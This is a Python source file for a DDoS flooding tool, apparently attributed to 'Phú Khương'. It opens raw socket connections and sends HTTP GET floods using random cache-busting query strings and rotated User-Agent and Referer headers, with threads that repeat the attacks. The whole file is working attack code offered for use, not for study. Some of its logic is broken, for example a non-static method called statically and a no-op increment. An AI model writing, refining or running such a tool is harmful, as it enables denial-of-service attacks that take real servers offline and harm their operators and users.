import socket
import urllib.request
import random
import string
import sys
import threading
import re



class SOCKET:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.ip = socket.gethostbyname(host)

    def attack(self):
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, 5))
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            dos.connect((self.ip, self.port))
            byt = (f"GET /{data} HTTP/1.1\nHost: {self.host}\n\n").encode()
            dos.send(byt)
        except socket.error:
            print(
                f"\n Ddos by Phú Khương, Server No Reponse - {str(socket.error)}")
            return 500
        finally:
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()


class REQ_HTTP:
    def __init__(self, url: str, host, headers_referers, headers_useragent):
        self.url = url
        

        self.host = host
        self.headers_referers = headers_referers
        self.headers_useragent = headers_useragent

    def buildblock(self, size):
        out_str = ''
        for i in range(0, size):
            a = random.randint(65, 90)
            out_str += chr(a)
        return(out_str)

    def attack(self):
        countThread.src()
        code = 0
        if self.url.count("?") > 0:
            param_joiner = "&"
        else:
            param_joiner = "?"
        request = urllib.request.Request(self.url + param_joiner + self.buildblock(
            random.randint(3, 10)) + '=' + self.buildblock(random.randint(3, 10)))
        request.add_header('User-Agent', random.choice(self.headers_useragent))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(
            self.headers_referers) + self.buildblock(random.randint(5, 10)))
        request.add_header('Keep-Alive', random.randint(110, 120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host', self.host)
        try:
            urllib.request.urlopen(request)
        except urllib.request.HTTPError as e:
            print('Response Code 500')
            code = 500
        except urllib.request.URLError as e:
            print('Response Code 404')
        else:
            urllib.request.urlopen(request)
        return(code)


class HTTP:
    def __init__(self):
        pass


class VARIABLE:
    url = ''
    host = ''
    ip = ''
    port = ''
    headers_referers = []
    headers_useragent = []
    type_ = ''
    stop = False
    die = False

class countThread:
    def __init__(self,logs,start):
        self.logs = logs
        self.n = start
    def src(self):
        self.logs.appendPlainText(f"[#] Thread [ {self.n} ] ")
        ++self.n
        
class StartThread(threading.Thread):
    def run(self):
        try:
            if VARIABLE.type_=='Socket':
                code = SOCKET(VARIABLE.host, VARIABLE.port).attack()
                if (code == 500) & VARIABLE.stop == True:
                    VARIABLE.die = True
            elif VARIABLE.type_=='Request.HTTP':
                code = REQ_HTTP(VARIABLE.url, VARIABLE.host, VARIABLE.headers_referers, VARIABLE.headers_useragent).attack()
                if (code == 500) & VARIABLE.stop == True:
                    VARIABLE.die = True
            else:
                pass
        except Exception as ex:
            pass
